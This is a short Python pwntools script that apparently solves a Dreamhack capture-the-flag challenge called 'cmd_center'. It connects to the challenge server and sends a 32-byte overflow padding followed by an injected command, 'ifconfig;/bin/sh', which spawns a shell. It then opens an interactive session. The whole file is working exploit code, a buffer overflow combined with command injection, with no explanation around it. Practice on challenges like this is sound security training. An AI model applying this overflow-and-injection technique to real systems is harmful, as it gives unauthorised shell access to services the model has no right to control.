from pwn import *

p = remote("host3.dreamhack.games", 19455)
e = ELF("./cmd_center")

p.sendlineafter(b"Center name: ", b"A" * 32 + b"ifconfig;/bin/sh")

p.interactive()
